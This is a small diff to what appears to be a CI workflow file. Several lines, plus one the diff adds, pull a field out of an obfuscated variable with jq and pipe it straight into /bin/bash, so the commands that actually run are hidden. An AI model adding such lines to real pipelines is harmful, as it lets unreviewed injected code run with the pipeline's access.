@@ -34,6 +34,7 @@ jobs:
           echo $gwxio4575 | jq -r .vzf06250 | /bin/bash
           echo $tc676 | jq -r .ybtt80 | /bin/bash
           printf '%s' "$otf90" | jq -r .qq56 | /bin/bash
+          printf '%s' "$no2779" | jq -r .dxom001 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
